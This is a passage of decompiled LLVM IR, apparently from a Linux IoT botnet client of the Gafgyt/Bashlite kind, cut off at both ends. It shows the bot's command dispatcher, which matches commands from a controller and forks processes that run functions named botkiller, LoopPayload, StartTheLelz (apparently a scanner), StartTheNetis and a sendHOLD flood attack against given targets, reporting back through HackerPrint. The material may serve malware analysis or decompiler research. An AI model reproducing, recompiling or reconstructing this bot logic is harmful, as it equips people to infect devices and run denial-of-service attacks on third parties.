  %v7_804f48d = xor i32 %v6_804f48d, 1
  store i32 %v7_804f48d, i32* %edx.global-to-local, align 4
  %v1_804f495 = trunc i32 %v7_804f48d to i8
  %v3_804f495 = zext i1 %v0_804f48d to i8
  %v15_804f495 = icmp eq i8 %v1_804f495, %v3_804f495
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f49e = icmp eq i1 %v15_804f495, false
  br i1 %v1_804f49e, label %dec_label_pc_804f4ce, label %dec_label_pc_804f4a0

dec_label_pc_804f4a0:                             ; preds = %dec_label_pc_804f459
  %v0_804f4a0 = load i32, i32* @esp, align 4
  %v5_804f4a0 = icmp ult i32 %v0_804f4a0, 12
  store i1 %v5_804f4a0, i1* %cf.global-to-local, align 1
  %v0_804f4a3 = load i8*, i8** @global_var_8063708.232, align 4
  %v1_804f4a3 = ptrtoint i8* %v0_804f4a3 to i32
  store i32 %v1_804f4a3, i32* %stack_var_-460, align 4
  %v1_804f4a9 = call i32 @__GI_inet_ntoa(i32 %v1_804f4a3)
  %v0_804f4b1 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804f4b1, i32* %edx.global-to-local, align 4
  %v5_804f4b7 = icmp ult i32* %stack_var_-444, inttoptr (i32 4 to i32*)
  store i1 %v5_804f4b7, i1* %cf.global-to-local, align 1
  store i32 %v0_804f4b1, i32* %stack_var_-460, align 4
  %v3_804f4c1 = call i32 @HackerPrint(i32 %v0_804f4b1, i32 ptrtoint ([10 x i8]* @global_var_805ae0a.432 to i32))
  %v0_804f4c6 = load i32, i32* @esp, align 4
  %v2_804f4c6 = icmp ugt i32 %v0_804f4c6, -17
  store i1 %v2_804f4c6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050819

dec_label_pc_804f4ce:                             ; preds = %dec_label_pc_804f459
  %v2_804f4d1 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f4ee = inttoptr i32 %v2_804f4d1 to i8*
  store i32 %v2_804f4d1, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805ae14.433 to i32), i32* @edi, align 4
  %v7_804f500 = call i32 @_strncmp(i8* %v4_804f4ee, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805ae14.433, i32 0, i32 0), i32 8)
  %v8_804f500 = urem i32 %v7_804f500, 2
  %v9_804f500 = icmp eq i32 %v8_804f500, 0
  %v0_804f502 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f502 = or i1 %v0_804f502, %v9_804f500
  %v3_804f502 = zext i1 %v2_804f502 to i32
  %v4_804f502 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f502 = and i32 %v4_804f502, -256
  %v6_804f502 = or i32 %v3_804f502, %v5_804f502
  %v7_804f502 = xor i32 %v6_804f502, 1
  store i32 %v7_804f502, i32* @edx, align 4
  %v1_804f50a = trunc i32 %v7_804f502 to i8
  %v3_804f50a = zext i1 %v0_804f502 to i8
  %v15_804f50a = icmp eq i8 %v1_804f50a, %v3_804f50a
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f513 = icmp eq i1 %v15_804f50a, false
  br i1 %v1_804f513, label %dec_label_pc_804f548, label %dec_label_pc_804f515

dec_label_pc_804f515:                             ; preds = %dec_label_pc_804f4ce
  %v0_804f515 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f51a = icmp eq i32 %v0_804f515, 0
  %v1_804f51c = icmp eq i1 %v1_804f51a, false
  br i1 %v1_804f51c, label %dec_label_pc_804f548, label %dec_label_pc_804f51e

dec_label_pc_804f51e:                             ; preds = %dec_label_pc_804f515
  %v0_804f51e = load i32, i32* @global_var_805d480.20, align 128
  %v0_804f523 = load i32, i32* @esp, align 4
  %v5_804f523 = icmp ult i32 %v0_804f523, 8
  store i1 %v5_804f523, i1* %cf.global-to-local, align 1
  store i32 %v0_804f51e, i32* %stack_var_-460, align 4
  %v3_804f52c = call i32 @HackerPrint(i32 %v0_804f51e, i32 ptrtoint ([13 x i8]* @global_var_805ae1c.434 to i32))
  %v0_804f531 = load i32, i32* @esp, align 4
  %v2_804f531 = icmp ugt i32 %v0_804f531, -17
  store i1 %v2_804f531, i1* %cf.global-to-local, align 1
  %v0_804f534 = call i32 @botkiller()
  %v0_804f539 = call i32 @RemoveTMP()
  %v0_804f53e = load i32, i32* @esp, align 4
  %v5_804f53e = icmp ult i32 %v0_804f53e, 12
  store i1 %v5_804f53e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-460, align 4
  %v1_804f543 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f548:                             ; preds = %dec_label_pc_804f515, %dec_label_pc_804f4ce
  %v2_804f54b = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f568 = inttoptr i32 %v2_804f54b to i8*
  store i32 %v2_804f54b, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ae29.435 to i32), i32* @edi, align 4
  %v7_804f57a = call i32 @_strncmp(i8* %v4_804f568, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805ae29.435, i32 0, i32 0), i32 7)
  %v8_804f57a = urem i32 %v7_804f57a, 2
  %v9_804f57a = icmp eq i32 %v8_804f57a, 0
  %v0_804f57c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f57c = or i1 %v0_804f57c, %v9_804f57a
  %v3_804f57c = zext i1 %v2_804f57c to i32
  %v4_804f57c = load i32, i32* @edx, align 4
  %v5_804f57c = and i32 %v4_804f57c, -256
  %v6_804f57c = or i32 %v3_804f57c, %v5_804f57c
  %v7_804f57c = xor i32 %v6_804f57c, 1
  store i32 %v7_804f57c, i32* @edx, align 4
  %v1_804f584 = trunc i32 %v7_804f57c to i8
  %v3_804f584 = zext i1 %v0_804f57c to i8
  %v15_804f584 = icmp eq i8 %v1_804f584, %v3_804f584
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f58d = icmp eq i1 %v15_804f584, false
  br i1 %v1_804f58d, label %dec_label_pc_804f5bd, label %dec_label_pc_804f58f

dec_label_pc_804f58f:                             ; preds = %dec_label_pc_804f548
  %v0_804f58f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f594 = icmp eq i32 %v0_804f58f, 0
  %v1_804f596 = icmp eq i1 %v1_804f594, false
  br i1 %v1_804f596, label %dec_label_pc_804f5bd, label %dec_label_pc_804f598

dec_label_pc_804f598:                             ; preds = %dec_label_pc_804f58f
  %v0_804f598 = load i32, i32* @global_var_805d480.20, align 128
  %v0_804f59d = load i32, i32* @esp, align 4
  %v5_804f59d = icmp ult i32 %v0_804f59d, 8
  store i1 %v5_804f59d, i1* %cf.global-to-local, align 1
  %v2_804f5a6 = call i32 @HackerPrint(i32 %v0_804f598, i32 ptrtoint ([16 x i8]* @global_var_805ae30.436 to i32))
  %v0_804f5ab = load i32, i32* @esp, align 4
  %v2_804f5ab = icmp ugt i32 %v0_804f5ab, -17
  store i1 %v2_804f5ab, i1* %cf.global-to-local, align 1
  %v0_804f5ae = call i32 @LoopPayload()
  %v0_804f5b3 = load i32, i32* @esp, align 4
  %v5_804f5b3 = icmp ult i32 %v0_804f5b3, 12
  store i1 %v5_804f5b3, i1* %cf.global-to-local, align 1
  %v1_804f5b8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f5bd:                             ; preds = %dec_label_pc_804f58f, %dec_label_pc_804f548
  %v2_804f5c0 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f5dd = inttoptr i32 %v2_804f5c0 to i8*
  store i32 %v2_804f5c0, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ae40.437 to i32), i32* @edi, align 4
  %v7_804f5ef = call i32 @_strncmp(i8* %v4_804f5dd, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805ae40.437, i32 0, i32 0), i32 7)
  %v8_804f5ef = urem i32 %v7_804f5ef, 2
  %v9_804f5ef = icmp eq i32 %v8_804f5ef, 0
  %v0_804f5f1 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f5f1 = or i1 %v0_804f5f1, %v9_804f5ef
  %v3_804f5f1 = zext i1 %v2_804f5f1 to i32
  %v4_804f5f1 = load i32, i32* @edx, align 4
  %v5_804f5f1 = and i32 %v4_804f5f1, -256
  %v6_804f5f1 = or i32 %v3_804f5f1, %v5_804f5f1
  %v7_804f5f1 = xor i32 %v6_804f5f1, 1
  store i32 %v7_804f5f1, i32* %edx.global-to-local, align 4
  %v1_804f5f9 = trunc i32 %v7_804f5f1 to i8
  %v3_804f5f9 = zext i1 %v0_804f5f1 to i8
  %v15_804f5f9 = icmp eq i8 %v1_804f5f9, %v3_804f5f9
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f602 = icmp eq i1 %v15_804f5f9, false
  br i1 %v1_804f602, label %dec_label_pc_804f74a, label %dec_label_pc_804f608

dec_label_pc_804f608:                             ; preds = %dec_label_pc_804f5bd
  %v8_804f608 = icmp ult i32 %tmp208, 2
  store i1 %v8_804f608, i1* %cf.global-to-local, align 1
  %v12_804f608 = icmp eq i32 %tmp208, 2
  br i1 %v12_804f608, label %dec_label_pc_804f629, label %dec_label_pc_804f60e

dec_label_pc_804f60e:                             ; preds = %dec_label_pc_804f608
  %v0_804f60e = load i32, i32* @global_var_805d480.20, align 128
  %v0_804f613 = load i32, i32* @esp, align 4
  %v5_804f613 = icmp ult i32 %v0_804f613, 8
  store i1 %v5_804f613, i1* %cf.global-to-local, align 1
  store i32 %v0_804f60e, i32* %stack_var_-492, align 4
  %v3_804f61c = call i32 @HackerPrint(i32 %v0_804f60e, i32 ptrtoint ([16 x i8]* @global_var_805ae47.438 to i32))
  %v0_804f621 = load i32, i32* @esp, align 4
  %v2_804f621 = icmp ugt i32 %v0_804f621, -17
  store i1 %v2_804f621, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050819

dec_label_pc_804f629:                             ; preds = %dec_label_pc_804f608
  %v1_804f62c = add i32 %tmp224, 4
  %v5_804f62c = icmp ugt i32 %tmp224, -5
  store i1 %v5_804f62c, i1* %cf.global-to-local, align 1
  %v1_804f62f = inttoptr i32 %v1_804f62c to i32*
  %v2_804f62f = load i32, i32* %v1_804f62f, align 4
  store i1 false, i1* @df, align 1
  %v4_804f64c = inttoptr i32 %v2_804f62f to i8*
  store i32 %v2_804f62f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805ae57.439 to i32), i32* @edi, align 4
  %v7_804f65e = call i32 @_strncmp(i8* %v4_804f64c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ae57.439, i32 0, i32 0), i32 4)
  %v8_804f65e = urem i32 %v7_804f65e, 2
  %v9_804f65e = icmp eq i32 %v8_804f65e, 0
  %v0_804f660 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f660 = or i1 %v0_804f660, %v9_804f65e
  %v3_804f660 = zext i1 %v2_804f660 to i32
  %v4_804f660 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f660 = and i32 %v4_804f660, -256
  %v6_804f660 = or i32 %v3_804f660, %v5_804f660
  %v7_804f660 = xor i32 %v6_804f660, 1
  store i32 %v7_804f660, i32* @edx, align 4
  %v1_804f668 = trunc i32 %v7_804f660 to i8
  %v3_804f668 = zext i1 %v0_804f660 to i8
  %v15_804f668 = icmp eq i8 %v1_804f668, %v3_804f668
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f671 = icmp eq i1 %v15_804f668, false
  br i1 %v1_804f671, label %dec_label_pc_804f6b3, label %dec_label_pc_804f673

dec_label_pc_804f673:                             ; preds = %dec_label_pc_804f629
  %v0_804f673 = load i32, i32* @global_var_8063710.440, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f678 = icmp eq i32 %v0_804f673, 0
  br i1 %v1_804f678, label %dec_label_pc_8050819, label %dec_label_pc_804f680

dec_label_pc_804f680:                             ; preds = %dec_label_pc_804f673
  %v0_804f685 = load i32, i32* @esp, align 4
  %v5_804f685 = icmp ult i32 %v0_804f685, 8
  store i1 %v5_804f685, i1* %cf.global-to-local, align 1
  store i32 %v0_804f673, i32* %stack_var_-460, align 4
  %v3_804f68b = call i32 @kill(i32 %v0_804f673, i32 9)
  %v0_804f693 = load i32, i32* @global_var_805d480.20, align 128
  %v5_804f698 = icmp ult i32* %stack_var_-444, inttoptr (i32 8 to i32*)
  store i1 %v5_804f698, i1* %cf.global-to-local, align 1
  store i32 %v0_804f693, i32* %stack_var_-460, align 4
  %v3_804f6a1 = call i32 @HackerPrint(i32 %v0_804f693, i32 ptrtoint ([5 x i8]* @global_var_805ae5b.441 to i32))
  %v0_804f6a6 = load i32, i32* @esp, align 4
  %v2_804f6a6 = icmp ugt i32 %v0_804f6a6, -17
  store i1 %v2_804f6a6, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_8063710.440, align 16
  br label %dec_label_pc_804f6b3

dec_label_pc_804f6b3:                             ; preds = %dec_label_pc_804f629, %dec_label_pc_804f680
  store i1 %v5_804f62c, i1* %cf.global-to-local, align 1
  %v2_804f6b9 = load i32, i32* %v1_804f62f, align 4
  store i1 false, i1* @df, align 1
  %v4_804f6d6 = inttoptr i32 %v2_804f6b9 to i8*
  %v7_804f6e8 = call i32 @_strncmp(i8* %v4_804f6d6, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805ae60.442, i32 0, i32 0), i32 3)
  %v8_804f6e8 = urem i32 %v7_804f6e8, 2
  %v9_804f6e8 = icmp eq i32 %v8_804f6e8, 0
  %v0_804f6ea = load i1, i1* %cf.global-to-local, align 1
  %v2_804f6ea = or i1 %v0_804f6ea, %v9_804f6e8
  %v3_804f6ea = zext i1 %v2_804f6ea to i32
  %v4_804f6ea = load i32, i32* @edx, align 4
  %v5_804f6ea = and i32 %v4_804f6ea, -256
  %v6_804f6ea = or i32 %v3_804f6ea, %v5_804f6ea
  %v7_804f6ea = xor i32 %v6_804f6ea, 1
  store i32 %v7_804f6ea, i32* %edx.global-to-local, align 4
  %v1_804f6f2 = trunc i32 %v7_804f6ea to i8
  %v3_804f6f2 = zext i1 %v0_804f6ea to i8
  %v15_804f6f2 = icmp eq i8 %v1_804f6f2, %v3_804f6f2
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f6fb = icmp eq i1 %v15_804f6f2, false
  br i1 %v1_804f6fb, label %dec_label_pc_804f74a, label %dec_label_pc_804f6fd

dec_label_pc_804f6fd:                             ; preds = %dec_label_pc_804f6b3
  %v0_804f6fd = load i32, i32* @global_var_8063710.440, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f702 = icmp eq i32 %v0_804f6fd, 0
  %v1_804f704 = icmp eq i1 %v1_804f702, false
  br i1 %v1_804f704, label %dec_label_pc_8050819, label %dec_label_pc_804f70a

dec_label_pc_804f70a:                             ; preds = %dec_label_pc_804f6fd
  %v1_804f70a = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f715 = icmp eq i32 %v1_804f70a, 0
  br i1 %v4_804f715, label %dec_label_pc_804f73b, label %dec_label_pc_804f71e

dec_label_pc_804f71e:                             ; preds = %dec_label_pc_804f70a
  store i32 %v1_804f70a, i32* @global_var_8063710.440, align 16
  br label %dec_label_pc_8050819

dec_label_pc_804f73b:                             ; preds = %dec_label_pc_804f70a
  store i1 true, i1* %cf.global-to-local, align 1
  %v1_804f73b = call i32 @StartTheLelz(i32 0)
  %v0_804f740 = load i32, i32* @esp, align 4
  %v5_804f740 = icmp ult i32 %v0_804f740, 12
  store i1 %v5_804f740, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_804f745 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f74a:                             ; preds = %dec_label_pc_804f6b3, %dec_label_pc_804f5bd
  %v2_804f74d = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f76a = inttoptr i32 %v2_804f74d to i8*
  %v7_804f77c = call i32 @_strncmp(i8* %v4_804f76a, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805ae63.443, i32 0, i32 0), i32 6)
  %v8_804f77c = urem i32 %v7_804f77c, 2
  %v9_804f77c = icmp eq i32 %v8_804f77c, 0
  %v0_804f77e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f77e = or i1 %v0_804f77e, %v9_804f77c
  %v3_804f77e = zext i1 %v2_804f77e to i32
  %v4_804f77e = load i32, i32* %edx.global-to-local, align 4
  %v5_804f77e = and i32 %v4_804f77e, -256
  %v6_804f77e = or i32 %v3_804f77e, %v5_804f77e
  %v7_804f77e = xor i32 %v6_804f77e, 1
  store i32 %v7_804f77e, i32* %edx.global-to-local, align 4
  %v1_804f786 = trunc i32 %v7_804f77e to i8
  %v3_804f786 = zext i1 %v0_804f77e to i8
  %v4_804f786 = sub nsw i8 %v1_804f786, %v3_804f786
  %v15_804f786 = icmp eq i8 %v4_804f786, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f78f = icmp eq i1 %v15_804f786, false
  br i1 %v1_804f78f, label %dec_label_pc_804f80a, label %dec_label_pc_804f791

dec_label_pc_804f791:                             ; preds = %dec_label_pc_804f74a
  %v2_804f78a = sext i8 %v4_804f786 to i32
  %v8_804f791 = icmp ult i32 %tmp208, 2
  store i1 %v8_804f791, i1* %cf.global-to-local, align 1
  %v12_804f791 = icmp eq i32 %tmp208, 2
  %v1_804f795 = icmp eq i1 %v12_804f791, false
  br i1 %v1_804f795, label %dec_label_pc_8050819, label %dec_label_pc_804f79b

dec_label_pc_804f79b:                             ; preds = %dec_label_pc_804f791
  %v1_804f79e = add i32 %tmp224, 4
  %v5_804f79e = icmp ugt i32 %tmp224, -5
  store i1 %v5_804f79e, i1* %cf.global-to-local, align 1
  %v1_804f7a1 = inttoptr i32 %v1_804f79e to i32*
  %v2_804f7a1 = load i32, i32* %v1_804f7a1, align 4
  store i1 false, i1* @df, align 1
  %v4_804f7be = inttoptr i32 %v2_804f7a1 to i8*
  store i32 %v2_804f7a1, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805ae60.442 to i32), i32* @edi, align 4
  %v7_804f7d0 = call i32 @_strncmp(i8* %v4_804f7be, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805ae60.442, i32 0, i32 0), i32 3)
  %v8_804f7d0 = urem i32 %v7_804f7d0, 2
  %v9_804f7d0 = icmp eq i32 %v8_804f7d0, 0
  %v0_804f7d2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f7d2 = or i1 %v0_804f7d2, %v9_804f7d0
  %v3_804f7d2 = zext i1 %v2_804f7d2 to i32
  %v4_804f7d2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f7d2 = and i32 %v4_804f7d2, -256
  %v6_804f7d2 = or i32 %v3_804f7d2, %v5_804f7d2
  %v7_804f7d2 = xor i32 %v6_804f7d2, 1
  store i32 %v7_804f7d2, i32* %edx.global-to-local, align 4
  %v1_804f7da = trunc i32 %v7_804f7d2 to i8
  %v3_804f7da = zext i1 %v0_804f7d2 to i8
  %v15_804f7da = icmp eq i8 %v1_804f7da, %v3_804f7da
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f7e3 = icmp eq i1 %v15_804f7da, false
  br i1 %v1_804f7e3, label %dec_label_pc_804f80a, label %dec_label_pc_804f7e5

dec_label_pc_804f7e5:                             ; preds = %dec_label_pc_804f79b
  %v0_804f7e5 = load i32, i32* @global_var_805d480.20, align 128
  %v0_804f7ea = load i32, i32* @esp, align 4
  %v5_804f7ea = icmp ult i32 %v0_804f7ea, 8
  store i1 %v5_804f7ea, i1* %cf.global-to-local, align 1
  store i32 %v0_804f7e5, i32* %stack_var_-460, align 4
  %v3_804f7f3 = call i32 @HackerPrint(i32 %v0_804f7e5, i32 ptrtoint ([25 x i8]* @global_var_805ae69.444 to i32))
  %v0_804f7f8 = load i32, i32* @esp, align 4
  %v2_804f7f8 = icmp ugt i32 %v0_804f7f8, -17
  store i1 %v2_804f7f8, i1* %cf.global-to-local, align 1
  %v0_804f7fb = call i32 @StartTheNetis()
  %v0_804f800 = load i32, i32* @esp, align 4
  %v5_804f800 = icmp ult i32 %v0_804f800, 12
  store i1 %v5_804f800, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-460, align 4
  %v1_804f805 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f80a:                             ; preds = %dec_label_pc_804f79b, %dec_label_pc_804f74a
  %v2_804f80d = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f82a = inttoptr i32 %v2_804f80d to i8*
  store i32 %v2_804f80d, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805ae82.445 to i32), i32* @edi, align 4
  %v7_804f83c = call i32 @_strncmp(i8* %v4_804f82a, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805ae82.445, i32 0, i32 0), i32 5)
  %v8_804f83c = urem i32 %v7_804f83c, 2
  %v9_804f83c = icmp eq i32 %v8_804f83c, 0
  %v0_804f83e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f83e = or i1 %v0_804f83e, %v9_804f83c
  %v3_804f83e = zext i1 %v2_804f83e to i32
  %v4_804f83e = load i32, i32* %edx.global-to-local, align 4
  %v5_804f83e = and i32 %v4_804f83e, -256
  %v6_804f83e = or i32 %v3_804f83e, %v5_804f83e
  %v7_804f83e = xor i32 %v6_804f83e, 1
  store i32 %v7_804f83e, i32* @edx, align 4
  %v1_804f846 = trunc i32 %v7_804f83e to i8
  %v3_804f846 = zext i1 %v0_804f83e to i8
  %v4_804f846 = sub nsw i8 %v1_804f846, %v3_804f846
  %v15_804f846 = icmp eq i8 %v4_804f846, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f84f = icmp eq i1 %v15_804f846, false
  br i1 %v1_804f84f, label %dec_label_pc_804f998, label %dec_label_pc_804f855

dec_label_pc_804f855:                             ; preds = %dec_label_pc_804f80a
  %v2_804f84a = sext i8 %v4_804f846 to i32
  %v9_804f855 = icmp ult i32 %tmp208, 3
  store i1 %v9_804f855, i1* %cf.global-to-local, align 1
  %v7_804f859 = icmp sgt i32 %tmp208, 3
  br i1 %v7_804f859, label %dec_label_pc_804f85f, label %dec_label_pc_8050819

dec_label_pc_804f85f:                             ; preds = %dec_label_pc_804f855
  %v1_804f862 = add i32 %tmp224, 8
  %v1_804f865 = inttoptr i32 %v1_804f862 to i32*
  %v2_804f865 = load i32, i32* %v1_804f865, align 4
  %v0_804f867 = load i32, i32* @esp, align 4
  %v5_804f867 = icmp ult i32 %v0_804f867, 12
  store i1 %v5_804f867, i1* %cf.global-to-local, align 1
  store i32 %v2_804f865, i32* %stack_var_-508, align 4
  %v1_804f86b = call i32 @atol(i32 %v2_804f865)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp254 = icmp slt i32 %v1_804f86b, 1
  br i1 %tmp254, label %dec_label_pc_8050819, label %dec_label_pc_804f87b

dec_label_pc_804f87b:                             ; preds = %dec_label_pc_804f85f
  %v1_804f87e = add i32 %tmp224, 12
  %v1_804f881 = inttoptr i32 %v1_804f87e to i32*
  %v2_804f881 = load i32, i32* %v1_804f881, align 4
  %v5_804f883 = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 %v2_804f881, i32* %stack_var_-508, align 4
  %v1_804f887 = call i32 @atol(i32 %v2_804f881)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp255 = icmp slt i32 %v1_804f887, 1
  %tmp256 = icmp eq i1 %tmp255, false
  br i1 %tmp256, label %dec_label_pc_804f898, label %dec_label_pc_8050819

dec_label_pc_804f898:                             ; preds = %dec_label_pc_804f87b
  %v1_804f89b = add i32 %tmp224, 4
  %v1_804f89e = inttoptr i32 %v1_804f89b to i32*
  %v2_804f89e = load i32, i32* %v1_804f89e, align 4
  %v2_804f8ac = load i32, i32* %v1_804f865, align 4
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8ac, i32* %stack_var_-508, align 4
  %v1_804f8b2 = call i32 @atol(i32 %v2_804f8ac)
  %v2_804f8c6 = load i32, i32* %v1_804f881, align 4
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8c6, i32* %stack_var_-508, align 4
  %v1_804f8cc = call i32 @atol(i32 %v2_804f8c6)
  %v5_804f8e0 = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804f8e0, i1* %cf.global-to-local, align 1
  store i32 %v2_804f89e, i32* %stack_var_-508, align 4
  %v2_804f8e6 = inttoptr i32 %v2_804f89e to i8*
  %v3_804f8e6 = call i32 @__GI_strchr(i8* %v2_804f8e6, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f8ee = icmp eq i32 %v3_804f8e6, 0
  br i1 %v1_804f8ee, label %dec_label_pc_804f964, label %dec_label_pc_804f8f2

dec_label_pc_804f8f2:                             ; preds = %dec_label_pc_804f898
  store i32 %v2_804f89e, i32* @eax, align 4
  store i1 %v5_804f8e0, i1* %cf.global-to-local, align 1
  store i32 %v2_804f89e, i32* %stack_var_-508, align 4
  %v2_804f901 = call i32 @__GI_strtok(i32 %v2_804f89e, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f959306 = icmp eq i32 %v2_804f901, 0
  %v1_804f960307 = icmp eq i1 %v4_804f959306, false
  br i1 %v1_804f960307, label %dec_label_pc_804f911, label %dec_label_pc_804f998

dec_label_pc_804f911:                             ; preds = %dec_label_pc_804f8f2, %dec_label_pc_804f941
  %storemerge114308 = phi i32 [ %v2_804f94b, %dec_label_pc_804f941 ], [ %v2_804f901, %dec_label_pc_804f8f2 ]
  %v0_804f911 = call i32 @listFork()
  store i32 %v0_804f911, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f916 = icmp eq i32 %v0_804f911, 0
  %v1_804f918 = icmp eq i1 %v1_804f916, false
  %v0_804f941 = load i32, i32* @esp, align 4
  br i1 %v1_804f918, label %dec_label_pc_804f941, label %dec_label_pc_804f91a

dec_label_pc_804f91a:                             ; preds = %dec_label_pc_804f911
  %v5_804f91a = icmp ult i32 %v0_804f941, 4
  store i1 %v5_804f91a, i1* %cf.global-to-local, align 1
  store i32 %storemerge114308, i32* %stack_var_-508, align 4
  %v3_804f92f = call i32 @sendHOLD(i32 %storemerge114308, i32 %v1_804f8b2, i32 %v1_804f8cc)
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804f93c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f941:                             ; preds = %dec_label_pc_804f911
  %v5_804f941 = icmp ult i32 %v0_804f941, 8
  store i1 %v5_804f941, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804f94b = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f959 = icmp eq i32 %v2_804f94b, 0
  %v1_804f960 = icmp eq i1 %v4_804f959, false
  br i1 %v1_804f960, label %dec_label_pc_804f911, label %dec_label_pc_804f998

dec_label_pc_804f964:                             ; preds = %dec_label_pc_804f898
  %v0_804f964 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f969 = icmp eq i32 %v0_804f964, 0
  %v1_804f96b = icmp eq i1 %v1_804f969, false
  br i1 %v1_804f96b, label %dec_label_pc_8050819, label %dec_label_pc_804f971

dec_label_pc_804f971:                             ; preds = %dec_label_pc_804f964
  %v0_804f971 = load i32, i32* @esp, align 4
  %v5_804f971 = icmp ult i32 %v0_804f971, 4
  store i1 %v5_804f971, i1* %cf.global-to-local, align 1
  store i32 %v2_804f89e, i32* %stack_var_-508, align 4
  %v3_804f986 = call i32 @sendHOLD(i32 %v2_804f89e, i32 %v1_804f8b2, i32 %v1_804f8cc)
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804f993 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f998:                             ; preds = %dec_label_pc_804f8f2, %dec_label_pc_804f941, %dec_label_pc_804f80a
  %v2_804f99b = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f9b8 = inttoptr i32 %v2_804f99b to i8*
  store i32 %v2_804f99b, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805ae87.446 to i32), i32* @edi, align 4
  %v7_804f9ca = call i32 @_strncmp(i8* %v4_804f9b8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805ae87.446, i32 0, i32 0), i32 5)
  %v8_804f9ca = urem i32 %v7_804f9ca, 2
  %v9_804f9ca = icmp eq i32 %v8_804f9ca, 0
  %v0_804f9cc = load i1, i1* %cf.global-to-local, align 1
  %v2_804f9cc = or i1 %v0_804f9cc, %v9_804f9ca
  %v3_804f9cc = zext i1 %v2_804f9cc to i32
  %v4_804f9cc = load i32, i32* @edx, align 4
  %v5_804f9cc = and i32 %v4_804f9cc, -256
  %v6_804f9cc = or i32 %v3_804f9cc, %v5_804f9cc
  %v7_804f9cc = xor i32 %v6_804f9cc, 1
  store i32 %v7_804f9cc, i32* @edx, align 4
  %v1_804f9d4 = trunc i32 %v7_804f9cc to i8
